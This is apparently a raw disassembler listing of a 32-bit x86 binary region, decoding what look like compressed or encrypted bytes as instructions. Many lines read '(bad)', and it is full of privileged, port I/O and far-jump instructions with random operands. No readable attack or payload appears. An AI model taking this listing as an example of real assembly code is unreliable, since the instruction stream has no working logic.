  4226e3:	paddd  mm2,QWORD PTR fs:[eax+edi*4+0x3a]
  4226e9:	cmc    
  4226ea:	mov    ebx,0x7ea4d9b3
  4226ef:	xchg   ecx,ebx
  4226f1:	dec    DWORD PTR [eax-0xb]
  4226f4:	(bad)  
  4226f6:	(bad)  
  4226f7:	loope  0x42271b
  4226f9:	cmp    al,al
  4226fb:	sub    eax,0x9f4c8b19
  422700:	loopne 0x422709
  422702:	mov    WORD PTR [ebx+0x23],cs
  422705:	inc    ecx
  422706:	(bad)  
  422707:	sahf   
  422708:	inc    eax
  422709:	out    dx,eax
  42270a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42270b:	pop    edx
  42270c:	ins    DWORD PTR es:[edi],dx
  42270d:	arpl   WORD PTR [ecx],sp
  42270f:	push   es
  422710:	mov    ecx,0xc91d4ad9
  422715:	or     eax,0x7eceedc6
  42271a:	(bad)  [edx]
  42271c:	mov    esi,0x26ac649d
  422721:	pop    ebp
  422722:	jl     0x4226d4
  422724:	int    0x74
  422726:	adc    al,0x37
  422728:	adc    eax,0xb8ed4780
  42272d:	sbb    BYTE PTR [ebp-0x6eae4d8f],bl
  422733:	push   0x67
  422735:	inc    esi
  422736:	pop    eax
  422737:	(bad)  
  422738:	jge    0x4226f5
  42273a:	bound  ebx,QWORD PTR [edx]
  42273c:	(bad)
  42273f:	in     ax,0x0
	...
  4227b2:	add    BYTE PTR [eax],al
  4227b4:	shl    DWORD PTR [eax-0x6061f47],1
  4227ba:	fnstenv [ecx-0x69b500ed]
  4227c0:	xchg   edi,eax
  4227c1:	or     al,0x15
  4227c3:	outs   dx,DWORD PTR ds:[esi]
  4227c4:	push   ecx
  4227c5:	jo     0x4227c8
  4227c7:	add    ch,dh
  4227c9:	add    BYTE PTR [eax],al
  4227cb:	add    bl,bl
  4227cd:	cmp    eax,0xcfd10bd9
  4227d2:	jge    0x4227fa
  4227d4:	push   esi
  4227d5:	mov    ebp,0xcc05954b
  4227da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227db:	shr    DWORD PTR [esi+eiz*1-0x3d],cl
  4227df:	jno    0x42276a
  4227e1:	rcr    ebx,cl
  4227e3:	xchg   esi,eax
  4227e4:	pop    eax
  4227e5:	inc    edi
  4227e6:	push   ebp
  4227e7:	sub    eax,0x370a987e
  4227ec:	(bad)  
  4227ed:	out    dx,al
  4227ee:	cmp    edi,DWORD PTR ds:0xcbc71778
  4227f4:	sti    
  4227f5:	xchg   edi,eax
  4227f6:	imul   esi,DWORD PTR [esi],0x5fa830d0
  4227fc:	cmp    ah,dh
  4227fe:	jecxz  0x4227f6
  422800:	xchg   DWORD PTR [esi+ebx*1],edi
  422803:	xchg   edx,eax
  422804:	ds into 
  422806:	les    ebx,FWORD PTR [edi+0x35173574]
  42280c:	icebp  
  42280d:	add    ebx,DWORD PTR [eax-0x4c]
  422810:	enter  0xfe13,0x4f
  422814:	or     DWORD PTR [edi+0x749a0a75],edi
  42281a:	bound  edx,QWORD PTR [edi]
  42281c:	push   ss
  42281d:	xlat   BYTE PTR ds:[ebx]
  42281e:	mov    ds:0xb9077ea2,eax
  422823:	jbe    0x422827
  422825:	sub    esp,DWORD PTR [ecx+eax*4+0x41]
  422829:	sti    
  42282a:	xor    esp,DWORD PTR ds:0x9db868be
  422830:	mov    eax,0x773aa982
  422835:	adc    dh,dh
  422837:	pop    esi
  422838:	xchg   esi,eax
  422839:	nop
  42283a:	mov    al,0xda
  42283c:	mov    esi,0xf8da7ccc
  422841:	cwde   
  422842:	loope  0x422867
  422844:	push   ecx
  422845:	(bad)
  422848:	mov    ecx,0x2ae26c4a
  42284d:	mov    ebp,0x700dc3ae
  422852:	jmp    0x8926:0xd5d9127e
  422859:	je     0x4227ed
  42285b:	mov    al,ds:0x1246f00
  422860:	or     ah,bh
  422862:	daa    
  422863:	jmp    0x422852
  422865:	lea    ebp,[ebp+0x1b]
  422868:	pop    ds
  422869:	lahf   
  42286a:	dec    ebx
  42286b:	(bad)  
  42286c:	iret   
  42286d:	loope  0x4228af
  42286f:	ds (bad) 
  422871:	push   eax
  422872:	retf   
  422873:	or     DWORD PTR [ecx+0x54],esi
  422876:	push   edx
  422877:	fisub  WORD PTR [ecx]
  422879:	mov    ds:0x8468ae9e,al
  42287e:	sub    ah,dl
  422880:	cs cmp eax,0x379bf2b8
  422886:	or     dh,BYTE PTR [ecx*8-0x77ed4b68]
  42288d:	xor    dh,BYTE PTR [esi+0x20b31f8b]
  422893:	jmp    0x906:0x4ea26590
  42289a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42289b:	leave  
  42289c:	dec    BYTE PTR [ebx]
  42289e:	mov    bh,0x91
  4228a0:	bound  ebp,QWORD PTR [ebx-0x66]
  4228a3:	jge    0x42284c
  4228a5:	sbb    al,0x67
  4228a7:	pop    ebx
  4228a8:	imul   esp,ebx,0x8
  4228ab:	fdivr  QWORD PTR [esi-0x7a]
  4228ae:	jnp    0x4228a8
  4228b0:	aas    
  4228b1:	stos   BYTE PTR es:[edi],al
  4228b2:	add    edx,DWORD PTR [ebx+edx*1+0x2e]
  4228b6:	int    0xbf
  4228b8:	nop
  4228b9:	xor    al,0x88
  4228bb:	into   
  4228bc:	push   bx
  4228be:	cdq    
  4228bf:	lods   eax,DWORD PTR ds:[esi]
  4228c0:	adc    DWORD PTR [eax],eax
	...
  422932:	add    BYTE PTR [eax],al
  422934:	(bad)  
  422935:	cld    
  422936:	je     0x422955
  422938:	jbe    0x4228d7
  42293a:	(bad)  
  42293b:	jmp    ebx
  42293d:	lea    ecx,[ebx]
  42293f:	xchg   esp,eax
  422940:	push   ecx
  422941:	mov    dl,0xe6
  422943:	mov    ebx,0x17146
  422948:	cmc    
  422949:	add    BYTE PTR [eax],al
  42294b:	add    BYTE PTR [eax],bl
  42294d:	mov    eax,ds:0x47499c6c
  422952:	jb     0x4228dd
  422954:	push   cs
  422955:	mov    ds:0xfddbef3b,eax
  42295a:	mov    cl,ch
  42295c:	xchg   esp,eax
  42295d:	es cli 
  42295f:	ins    DWORD PTR es:[edi],dx
  422960:	jnp    0x4229ab
  422962:	jle    0x4228ff
  422964:	jle    0x422929
  422966:	mov    al,0x20
  422968:	popa   
  422969:	ins    BYTE PTR es:[edi],dx
  42296a:	sti    
  42296b:	ds aam 0x42
  42296e:	rcl    BYTE PTR [edi],0xce
  422971:	xchg   esp,eax
  422972:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422973:	push   ss
  422974:	addr16 inc eax
  422976:	and    bh,BYTE PTR [ecx-0x3a798031]
  42297c:	pusha  
  42297d:	jae    0x4229d7
  42297f:	div    DWORD PTR [eax-0x62e0c05a]
  422985:	jbe    0x422a06
  422987:	aam    0x62
  422989:	retf   0x4340
  42298c:	xchg   ecx,eax
  42298d:	jp     0x4229ef
  42298f:	bound  edx,QWORD PTR [edx+0x60e7d7dc]
  422995:	mov    ds:0x1500e620,al
  42299a:	xor    eax,0xd899a3ff
  42299f:	sti    
  4229a0:	add    ch,ah
  4229a2:	ss add eax,0x9c867282
  4229a8:	xchg   esi,eax
  4229a9:	(bad)  
  4229aa:	pop    edx
  4229ab:	jae    0x4229e0
  4229ad:	fs lock jmp 0x29de:0xc2b61d81
  4229b6:	jg     0x422992
  4229b8:	loop   0x4229f6
  4229ba:	cmp    DWORD PTR [edx],ecx
  4229bc:	jne    0x4229a0
  4229be:	scas   eax,DWORD PTR es:[edi]
  4229bf:	mov    ds:0xd17b6ab0,al
  4229c4:	cmp    al,0x8f
  4229c6:	loopne 0x4229bd
  4229c8:	imul   edi,DWORD PTR [esi+0x58],0x1dd4d753
  4229cf:	pushf  
  4229d0:	retf   0xb975
  4229d3:	outs   dx,DWORD PTR ds:[esi]
  4229d4:	das    
  4229d5:	lods   al,BYTE PTR ds:[esi]
  4229d6:	and    al,BYTE PTR [ecx+0x27]
  4229d9:	push   ecx
  4229da:	jb     0x4229b4
  4229dc:	out    dx,al
  4229dd:	daa    
  4229de:	jp     0x422968
  4229e0:	rol    ch,0xde
  4229e3:	hlt    
  4229e4:	out    dx,eax
  4229e5:	push   ebp
  4229e6:	jl     0x4229ad
  4229e8:	fnstenv [ebp+0x21]
  4229eb:	loop   0x422a4c
  4229ed:	scas   eax,DWORD PTR es:[edi]
  4229ee:	inc    DWORD PTR es:[ebx-0x14d00c94]
  4229f5:	lahf   
  4229f6:	mov    ah,0xd6
  4229f8:	push   esi
  4229f9:	in     eax,0xe9
  4229fb:	and    al,0x3e
  4229fd:	pushf  
  4229fe:	repnz stc 
  422a00:	inc    ebp
  422a01:	arpl   WORD PTR [ebx],bp
  422a03:	xchg   esi,eax
  422a04:	in     al,0xb4
  422a06:	mov    bl,0xa1
  422a08:	jle    0x4229ee
  422a0a:	mov    esp,0x91d1d8ef
  422a0f:	out    0xf0,eax
  422a11:	sub    dh,BYTE PTR [ebp+0x23]
  422a14:	xor    bl,BYTE PTR [ebx+0x3a]
  422a17:	or     cl,BYTE PTR [ebx+0x67b6cc1]
  422a1d:	adc    edi,DWORD PTR [esi-0x12eb932c]
  422a23:	add    BYTE PTR [ecx],bh
  422a25:	mov    bh,0xd0
  422a27:	xchg   ecx,eax
  422a28:	mov    dh,0x4
  422a2a:	dec    esi
  422a2b:	xor    al,0xaa
  422a2d:	data16 fstp TBYTE PTR es:[eax]
  422a31:	or     al,BYTE PTR [eax+0x2563da99]
  422a37:	pop    esi
  422a38:	inc    ebx
  422a39:	and    BYTE PTR [ecx+0x6d],ch
  422a3c:	pusha  
  422a3d:	xlat   BYTE PTR ds:[ebx]
  422a3e:	dec    edx
  422a3f:	aam    0x29
	...
  422ab1:	add    BYTE PTR [eax],al
  422ab3:	add    BYTE PTR [esi],dl
  422ab5:	cdq    
  422ab6:	jmp    0x37401a88
  422abb:	fcmovnbe st,st(0)
  422abd:	cld    
  422abe:	xor    al,0xd0
  422ac0:	lock mov al,ds:0x723b116c
  422ac6:	add    DWORD PTR [eax],eax
  422ac8:	cmc    
  422ac9:	add    BYTE PTR [eax],al
  422acb:	add    ch,dh
  422acd:	outs   dx,BYTE PTR ds:[esi]
  422ace:	(bad)  
  422acf:	fnsave [edx]
  422ad1:	clc    
  422ad2:	add    al,ch
  422ad4:	or     eax,esi
  422ad6:	mov    ds:0xa51c8bc9,eax
  422adb:	sub    BYTE PTR [ecx],0x35
  422ade:	xlat   BYTE PTR ds:[ebx]
  422adf:	setbe  BYTE PTR [edi]
  422ae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ae3:	inc    eax
  422ae4:	dec    ebx
  422ae5:	xchg   ebp,eax
  422ae6:	cmp    al,0xf8
  422ae8:	fdivr  DWORD PTR [edx]
  422aea:	dec    ecx
  422aeb:	out    dx,al
  422aec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422aed:	and    BYTE PTR [edi-0x6cf60dc6],cl
  422af3:	or     eax,0xb3fa28c
  422af8:	imul   edx,eax,0xa04e42df
  422afe:	mov    edx,0x5e83b035
  422b03:	mov    edi,0xb193d37b
  422b08:	shl    BYTE PTR [edi-0x3d871f5b],0x49
  422b0f:	jl     0x422b87
  422b11:	lds    esi,FWORD PTR [esp+ebx*8+0x1b2f5c16]
  422b18:	mov    ecx,0xfb23e329
  422b1d:	jne    0x422b24
  422b1f:	sbb    ebx,DWORD PTR [edx+edx*2-0x55b08648]
  422b26:	or     edx,eax
  422b28:	fisubr DWORD PTR [ebp-0x1811d0d7]
  422b2e:	jge    0x422ac8
  422b30:	mov    al,0xa9
  422b32:	mov    edx,DWORD PTR [esi+eiz*4+0x24053461]
  422b39:	add    bl,bh
  422b3b:	jno    0x422b55
  422b3d:	(bad)  
  422b3e:	or     DWORD PTR [ecx+0x3b],edx
  422b41:	sub    cl,BYTE PTR [edx-0x4]
  422b44:	fmul   QWORD PTR [ebx-0x57]
  422b47:	test   al,0x2e
  422b49:	jnp    0x422b38
  422b4b:	ret    
  422b4c:	jge    0x422b9b
  422b4e:	add    BYTE PTR [esi+0xa44696f],bh
  422b54:	pop    es
  422b55:	sbb    DWORD PTR ds:0xb505d857,ecx
  422b5b:	xchg   esi,eax
  422b5c:	mov    edx,0x92dc9204
  422b61:	sub    al,0xa3
  422b63:	mov    al,0x78
  422b65:	mov    ch,0xe1
  422b67:	ds jns 0x422b02
  422b6a:	push   edi
  422b6b:	out    0xa7,eax
  422b6d:	xor    dh,BYTE PTR [eax]
  422b6f:	int    0xb8
  422b71:	out    dx,al
  422b72:	pop    esi
  422b73:	adc    DWORD PTR [ecx+ebx*1],esp
  422b76:	jb     0x422b00
  422b78:	add    BYTE PTR [ebx],ch
  422b7a:	gs jo  0x422b05
  422b7d:	sahf   
  422b7e:	push   0x206ec751
  422b83:	or     al,al
  422b85:	pop    eax
  422b86:	adc    al,0x32
  422b88:	mov    dl,0x72
  422b8a:	jo     0x422bb5
  422b8c:	sub    ecx,DWORD PTR [ecx+0x36ac83e9]
  422b92:	sbb    DWORD PTR [edx-0x64],ebx
  422b95:	aas    
  422b96:	ins    DWORD PTR es:[edi],dx
  422b97:	push   esi
  422b98:	or     BYTE PTR [ebx],cl
  422b9a:	pop    eax
  422b9b:	clc    
  422b9c:	mov    dl,0x2c
  422b9e:	bound  ebp,QWORD PTR [edx-0x74077cb2]
  422ba4:	dec    ecx
  422ba5:	cmp    al,0x8
  422ba7:	ficom  DWORD PTR [edx-0x3c5b9e91]
  422bad:	(bad)  
  422bae:	imul   edx,DWORD PTR es:[eax+0x74],0xf6cf2b8a
  422bb6:	mov    edi,0x690b23fc
  422bbb:	push   0x5f
  422bbd:	icebp  
  422bbe:	pop    ss
  422bbf:	scas   eax,DWORD PTR es:[edi]
  422bc0:	add    BYTE PTR gs:[eax],al
	...
  422c33:	add    BYTE PTR [eax-0x1a4a95],dh
  422c39:	push   eax
  422c3b:	jg     0x422c9e
  422c3d:	pop    es
  422c3e:	jne    0x422bca
  422c40:	jge    0x422c15
  422c42:	(bad)  
  422c43:	repnz xor BYTE PTR [ebx+0x1],dh
  422c47:	add    ch,dh
  422c49:	add    BYTE PTR [eax],al
  422c4b:	add    ah,bh
  422c4d:	adc    DWORD PTR [edi],ecx
  422c4f:	sahf   
  422c50:	retf   0x38f2
  422c53:	mov    dl,0x17
  422c55:	xor    BYTE PTR cs:[ebx],bh
  422c58:	div    cl
  422c5a:	out    dx,al
  422c5b:	cmp    eax,0xd8bd0744
  422c60:	add    eax,0x1843f72b
  422c65:	push   ebp
  422c66:	jp     0x422cd2
  422c68:	(bad)  
  422c69:	jecxz  0x422c66
  422c6b:	pop    esp
  422c6c:	pop    edi
  422c6d:	enter  0x6e4f,0x25
  422c71:	js     0x422c33
  422c73:	lods   eax,DWORD PTR ds:[esi]
  422c74:	imul   esi,DWORD PTR [edx],0x48675a1b
  422c7a:	lea    esi,[esi-0x75]
  422c7d:	push   0x26
  422c7f:	retf   
  422c80:	sti    
  422c81:	sahf   
  422c82:	out    dx,al
  422c83:	fcom   DWORD PTR [ebx-0x80]
  422c86:	add    BYTE PTR [eax-0x13f615d3],dl
  422c8c:	xor    BYTE PTR [ecx-0x61],0xce
  422c90:	mov    dl,bh
  422c92:	push   esi
  422c93:	cmp    bh,BYTE PTR [ebx]
  422c95:	loope  0x422cc5
  422c97:	adc    DWORD PTR [ebx+edi*2],ecx
  422c9a:	sbb    bl,BYTE PTR [ebx]
  422c9c:	pop    es
  422c9d:	sub    al,0x5d
  422c9f:	rcl    DWORD PTR ds:0x1874bda6,0x7c
  422ca6:	imul   BYTE PTR [eax+0x4b16cec7]
  422cac:	imul   esp,DWORD PTR [esp+eiz*4-0x5fc03c76],0xfffffff0
  422cb4:	dec    ebp
  422cb5:	push   ds
  422cb6:	daa    
  422cb7:	fisubr DWORD PTR [eax+0x2a968439]
  422cbd:	sahf   
  422cbe:	jge    0x422c87
  422cc0:	inc    eax
  422cc1:	pop    edx
  422cc2:	das    
  422cc3:	js     0x422cda
  422cc5:	or     al,0xd0
  422cc7:	cmp    edx,eax
  422cc9:	mov    bl,0x64
  422ccc:	push   ss
  422ccd:	push   0xffffffe2
  422ccf:	int3   
  422cd0:	cmc    
  422cd1:	jg     0x422c53
  422cd3:	sub    edi,eax
  422cd5:	jae    0x422caf
  422cd7:	inc    ebp
  422cd8:	das    
  422cd9:	lock mov bh,0xa
  422cdc:	fwait
  422cdd:	mov    eax,ds:0x4dcb6a6
  422ce2:	ins    BYTE PTR es:[edi],dx
  422ce3:	hlt    
  422ce4:	retf   
  422ce5:	dec    esp
  422ce6:	mov    eax,ds:0x434b45b
  422ceb:	lock in al,0xd6
  422cee:	scas   al,BYTE PTR es:[edi]
  422cef:	test   DWORD PTR [ecx-0x1630f3c9],0x48db5fd7
  422cf9:	push   ecx
  422cfa:	sbb    al,0x47
  422cfc:	dec    edi
  422cfd:	and    al,0x51
  422cff:	xchg   ebp,ecx
  422d01:	jbe    0x422cc3
  422d03:	test   al,0x14
  422d05:	aam    0xb0
  422d07:	leave  
  422d08:	pop    ecx
  422d09:	popa   
  422d0a:	rcr    BYTE PTR [esi-0x5617ff82],0x74
  422d11:	mov    ds:0x7b0e3d57,eax
  422d16:	pop    ss
  422d17:	inc    eax
  422d18:	or     al,0xdd
  422d1a:	jns    0x422d6e
  422d1c:	lods   eax,DWORD PTR ds:[esi]
  422d1d:	push   esp
  422d1e:	or     ah,cl
  422d20:	mov    edx,0xe1413bb9
  422d25:	mov    eax,0xfd525421
  422d2a:	dec    esi
  422d2b:	jg     0x422cf2
  422d2d:	jecxz  0x422cba
  422d2f:	push   ds
  422d30:	das    
  422d31:	push   ds
  422d32:	sbb    eax,0xa7cdb2da
  422d37:	cld    
  422d38:	pop    eax
  422d39:	push   esp
  422d3a:	and    DWORD PTR [esi-0x10e3e9de],edi
  422d40:	outs   dx,DWORD PTR ds:[esi]
	...
  422db1:	add    BYTE PTR [eax],al
  422db3:	add    bh,cl
  422db5:	mov    eax,ds:0xbf7f851b
  422dba:	fucomip st,st(3)
  422dbc:	addr16 mov ecx,0xd77ff9f7
  422dc2:	sbb    eax,0x17425d5
  422dc7:	add    ch,dh
  422dc9:	add    BYTE PTR [eax],al
  422dcb:	add    BYTE PTR [edx-0x17],ch
  422dce:	jecxz  0x422e21
  422dd0:	ins    DWORD PTR es:[edi],dx
  422dd1:	mov    WORD PTR [ebx],ds
  422dd3:	and    BYTE PTR [eax+0x5065bfa],al
  422dd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dda:	add    al,ah
  422ddc:	dec    esi
  422ddd:	inc    eax
  422dde:	jns    0x422d77
  422de0:	fstp   TBYTE PTR [ecx-0x60]
  422de3:	outs   dx,DWORD PTR ds:[esi]
  422de4:	xchg   ecx,eax
  422de5:	popa   
  422de6:	xor    esi,DWORD PTR [ecx+eiz*4+0x42]
  422dea:	int    0x6f
  422dec:	cmp    bh,BYTE PTR [ecx+edi*1]
  422def:	pop    ebp
  422df0:	mov    al,ds:0x9268e9fa
  422df5:	nop
  422df6:	adc    eax,0x7a3d28a8
  422dfb:	sbb    dl,BYTE PTR [eax]
  422dfd:	inc    ebx
  422dfe:	mov    ds:0x4a61df34,eax
  422e03:	push   esi
  422e04:	out    dx,eax
  422e05:	jmp    0x1b8e:0xbadb7a92
  422e0c:	xchg   DWORD PTR [edx-0x26],ebx
  422e0f:	jl     0x422e4f
  422e11:	mov    cl,0x58
  422e13:	stos   BYTE PTR es:[edi],al
  422e14:	ret    
  422e15:	cmp    eax,0xbb9369ab
  422e1a:	xlat   BYTE PTR ds:[ebx]
  422e1b:	adc    al,0x62
  422e1e:	xchg   DWORD PTR [edx],esp
  422e20:	cdq    
  422e21:	mov    edx,0x53882fbf
  422e26:	das    
  422e27:	arpl   sp,cx
  422e29:	xor    eax,0x934e9919
  422e2e:	daa    
  422e2f:	paddb  mm1,QWORD PTR [si+0x6f8a]
  422e35:	call   0xab234c90
  422e3a:	stos   BYTE PTR es:[edi],al
  422e3b:	xor    DWORD PTR [ebp+0xb],ecx
  422e3e:	push   edx
  422e3f:	jp     0x422e76
  422e41:	mov    eax,DWORD PTR [esi]
  422e43:	jecxz  0x422dd5
  422e45:	outs   dx,DWORD PTR ds:[esi]
  422e47:	mov    ds:0xf038e0c1,al
  422e4c:	stos   DWORD PTR es:[edi],eax
  422e4d:	mov    al,ds:0x8675f8ae
  422e52:	pop    ds
  422e53:	adc    DWORD PTR [eax],eax
  422e55:	popa   
  422e56:	in     eax,0xa8
  422e58:	stos   DWORD PTR es:[edi],eax
  422e59:	enter  0xb881,0xa7
  422e5d:	and    DWORD PTR ds:[edx-0x3a],ebp
  422e61:	int3   
  422e62:	in     al,0x8
  422e64:	aaa    
  422e65:	push   esp
  422e66:	jo     0x422e9f
  422e68:	imul   ecx,DWORD PTR [edx+0x2c48c9b6],0xffffff9b
  422e6f:	sti    
  422e70:	ins    DWORD PTR es:[edi],dx
  422e71:	jbe    0x422e76
  422e73:	sbb    al,0xf4
  422e75:	or     eax,0xbf244a05
  422e7a:	fld    DWORD PTR [eax-0x2ee08b3f]
  422e80:	fisubr DWORD PTR [esi]
  422e82:	(bad)  
  422e83:	mov    eax,0xa6e93a10
  422e88:	lahf   
  422e89:	adc    BYTE PTR [eax-0x23],bl
  422e8c:	loope  0x422eb1
  422e8e:	(bad)  
  422e8f:	xor    esi,esp
  422e91:	jno    0x422efa
  422e93:	cli    
  422e94:	inc    BYTE PTR [eax]
  422e96:	mov    ecx,0xb32fe2e0
  422e9b:	dec    edx
  422e9c:	push   0x5d62bb05
  422ea1:	jl     0x422f03
  422ea3:	into   
  422ea4:	adc    eax,0x504c913f
  422ea9:	dec    edi
  422eaa:	mov    edi,0x7e243ce7
  422eaf:	push   ecx
  422eb0:	in     eax,dx
  422eb1:	jbe    0x422ec0
  422eb3:	xor    dh,ch
  422eb5:	ins    DWORD PTR es:[edi],dx
  422eb6:	call   0x8141cedc
  422ebb:	lock inc esi
  422ebd:	pop    esi
  422ebe:	dec    edi
  422ebf:	sbb    al,0xf7
	...
  422f31:	add    BYTE PTR [eax],al
  422f33:	add    BYTE PTR [ebx+0x6],ch
  422f36:	(bad)  
  422f37:	dec    edi
  422f38:	out    dx,eax
  422f39:	iret   
  422f3a:	jmp    0x422f62
  422f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f3d:	add    cl,BYTE PTR fs:[bp+si+0x76]
  422f42:	data16 int 0x1a
  422f45:	jne    0x422f48
  422f47:	add    ch,dh
  422f49:	add    BYTE PTR [eax],al
  422f4b:	add    BYTE PTR [edx+edi*2+0x61],dl
  422f4f:	sbb    al,0x8
  422f51:	push   ecx
  422f52:	in     eax,dx
  422f53:	add    BYTE PTR [esi-0x40],cl
  422f56:	scas   al,BYTE PTR es:[edi]
  422f57:	sti    
  422f58:	gs or  al,0xd3
  422f5b:	cli    
  422f5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f5d:	out    0x94,al
  422f5f:	sbb    eax,0xdeabea42
  422f64:	out    dx,eax
  422f65:	pop    es
  422f66:	std    
  422f67:	dec    edi
  422f68:	sbb    dh,dh
  422f6a:	shr    DWORD PTR [ebx-0x33],cl
  422f6d:	cmc    
  422f6e:	inc    ebp
  422f6f:	lea    ebx,[edx-0x6f]
  422f72:	mov    esi,0x2181449f
  422f77:	ret    
  422f78:	jbe    0x422f08
  422f7a:	fs cld 
  422f7c:	or     DWORD PTR [ebp-0x7e],edi
  422f7f:	dec    si
  422f81:	fsub   QWORD PTR [edx]
  422f83:	mov    gs,WORD PTR [ecx]
  422f85:	mov    ds:0x7a6a5761,eax
  422f8a:	mov    ds:0xe209b121,al
  422f8f:	outs   dx,BYTE PTR ds:[esi]
  422f90:	outs   dx,BYTE PTR ds:[esi]
  422f91:	(bad)  
  422f92:	jnp    0x422f7b
  422f94:	add    BYTE PTR [edi+edx*1+0x25],dl
  422f98:	xlat   BYTE PTR ds:[ebx]
  422f99:	mov    ds:0x506185f7,al
  422f9e:	fisttp DWORD PTR [edx]
  422fa0:	adc    al,0xe9
  422fa2:	push   cs
  422fa3:	and    DWORD PTR gs:[ecx+0x2c46a614],edx
  422faa:	jnp    0x422f5c
  422fac:	(bad)  
  422fad:	loopne 0x422fcc
  422faf:	adc    al,0x19
  422fb1:	les    ebp,FWORD PTR [eiz*1+0x26e13b0a]
  422fb8:	mov    DWORD PTR ds:0x2ae932e6,ecx
  422fbe:	mov    ds:0x5b208f3e,al
  422fc3:	scas   eax,DWORD PTR es:[edi]
  422fc4:	ret    
  422fc5:	or     BYTE PTR ds:0x1a976f2f,dl
  422fcb:	(bad)  
  422fcc:	cmp    al,0x10
  422fce:	test   BYTE PTR [edi-0x2d],bh
  422fd1:	ret    0x6372
  422fd4:	(bad)  
  422fd5:	nop
  422fd6:	mov    ch,0x56
  422fd8:	fcom   QWORD PTR [esi]
  422fda:	jg     0x422f6f
  422fdc:	sub    edi,DWORD PTR [edi-0x2a078d7]
  422fe2:	scas   eax,DWORD PTR es:[edi]
  422fe3:	stos   DWORD PTR es:[edi],eax
  422fe4:	inc    ebp
  422fe5:	(bad)  
  422fe6:	mov    ebx,0x5b4da403
  422feb:	push   0x78
  422fed:	xor    al,ch
  422fef:	fild   QWORD PTR [edi-0xa71346c]
  422ff5:	test   al,0x27
  422ff7:	popa   
  422ff8:	aaa    
  422ff9:	mov    edx,cs
  422ffb:	cli    
  422ffc:	mov    bh,0x3d
  422ffe:	cmp    BYTE PTR [esi+ecx*1-0x5c6eb8e],al
  423005:	stc    
  423006:	sub    BYTE PTR [edi],cl
  423008:	mov    bh,0xb9
  42300a:	das    
  42300b:	mov    ch,0x8b
  42300d:	jb     0x423039
  42300f:	ins    DWORD PTR es:[edi],dx
  423010:	fcomp  QWORD PTR [ebx-0x47063db7]
  423016:	out    0x5f,eax
  423018:	fisubr DWORD PTR [esi+0x15]
  42301b:	jo     0x423089
  42301d:	push   edi
  42301e:	nop
  42301f:	mov    ebp,0xbb94e842
  423024:	(bad)  
  423025:	xchg   edi,eax
  423026:	inc    ebp
  423027:	mov    esi,0xd7d9a84c
  42302c:	sti    
  42302d:	xor    DWORD PTR ds:0xe494739b,edx
  423033:	dec    edx
  423034:	in     eax,dx
  423035:	fwait
  423036:	dec    ebx
  423037:	or     BYTE PTR [edi-0x7c],0x27
  42303b:	and    eax,0xab1f5b87
  423040:	mov    WORD PTR [eax],es
	...
  4230b2:	add    BYTE PTR [eax],al
  4230b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230b5:	push   edx
  4230b6:	jnp    0x4230b5
  4230b8:	(bad)  
  4230b9:	std    
  4230ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230bb:	pop    ebx
  4230bc:	lods   eax,DWORD PTR ds:[esi]
  4230bd:	jne    0x423121
  4230bf:	xchg   ecx,eax
  4230c0:	xor    ebx,DWORD PTR [ecx]
  4230c2:	jmp    0xf500:0x1760fa9
  4230c9:	add    BYTE PTR [eax],al
  4230cb:	add    BYTE PTR [esi+0x4cd0c676],dh
  4230d1:	dec    edx
  4230d2:	sub    cl,dh
  4230d4:	imul   edi,ebx,0x27187e99
  4230da:	add    DWORD PTR [esi-0x5f],edx
  4230dd:	ds mov bl,0x7a
  4230e0:	aas    
  4230e1:	xor    DWORD PTR [esi+ecx*4+0x2a],ebx
  4230e5:	xor    BYTE PTR [ebx],ah
  4230e7:	(bad)  
  4230e8:	jge    0x423167
  4230ea:	(bad)  
  4230eb:	in     al,0x24
  4230ed:	inc    esp
  4230ee:	das    
  4230ef:	outs   dx,DWORD PTR ds:[esi]
  4230f0:	outs   dx,BYTE PTR ds:[esi]
  4230f1:	xchg   ebp,eax
  4230f2:	mul    DWORD PTR [ebx+ebx*2]
  4230f5:	test   al,0x74
  4230f7:	sahf   
  4230f8:	inc    edx
  4230f9:	adc    edi,DWORD PTR [ebp-0x5d7b4053]
  4230ff:	repz cmp al,0x70
  423102:	sbb    bl,BYTE PTR [ebp-0x5993325a]
  423108:	popf   
  423109:	adc    al,0xc8
  42310b:	or     al,BYTE PTR [esi-0x77]
  42310e:	push   edx
  42310f:	lods   al,BYTE PTR ds:[esi]
  423110:	xchg   BYTE PTR [esi+0x71],ah
  423113:	pop    ds
  423114:	retf   
  423115:	jb     0x4230a8
  423117:	mov    esi,0x632037e0
  42311c:	test   bh,bl
  42311e:	lahf   
  42311f:	xor    al,0x31
  423121:	add    ecx,DWORD PTR [eax-0x1863f0ca]
  423127:	xor    DWORD PTR [ebx],ecx
  423129:	pop    ebx
  42312a:	jge    0x4230fe
  42312c:	pop    ebx
  42312d:	pop    ds
  42312e:	cli    
  42312f:	int    0xa5
  423131:	push   0x30703cf
  423136:	leave  
  423137:	aas    
  423138:	mov    dl,0x1d
  42313a:	ins    DWORD PTR es:[edi],dx
  42313b:	mov    eax,0x41e58fd0
  423140:	push   eax
  423141:	scas   al,BYTE PTR es:[edi]
  423142:	shr    BYTE PTR [ebx+0x5055bf27],cl
  423148:	xlat   BYTE PTR ds:[ebx]
  423149:	push   esp
  42314a:	stc    
  42314b:	sahf   
  42314c:	btc    edi,eax
  42314f:	popf   
  423150:	xchg   BYTE PTR [edx-0x23],dh
  423153:	jno    0x4230fb
  423155:	inc    ebx
  423156:	pop    edi
  423157:	test   bl,0xff
  42315a:	xor    ch,BYTE PTR [edx]
  42315c:	jo     0x42317a
  42315e:	push   ebp
  42315f:	or     BYTE PTR [ebx],dl
  423161:	xchg   esi,eax
  423162:	mov    WORD PTR [esi+0x1fb80cf],es
  423168:	and    eax,0xd9de863c
  42316d:	daa    
  42316e:	popa   
  42316f:	pop    ds
